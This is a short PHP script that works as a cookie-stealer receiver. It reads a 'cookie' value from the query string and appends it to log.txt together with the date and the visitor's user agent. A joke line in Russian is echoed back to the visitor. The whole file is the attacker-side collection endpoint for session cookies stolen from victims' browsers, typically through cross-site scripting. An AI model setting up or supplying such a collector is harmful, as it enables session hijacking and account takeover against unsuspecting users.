<?php
echo 'ПОШЛИ ПИТЬ ПИВО';
$collectedCookie=$_GET["cookie"];
$date=date("l ds of F Y h:i:s A");
$user_agent=$_SERVER['HTTP_USER_AGENT'];
$file=fopen('log.txt','a'); // chmod 777 log.txt
fwrite($file,"DATE:$date || USER AGENT:$user_agent || COOKIE:$collectedCookie \n");
fclose($file);
?>
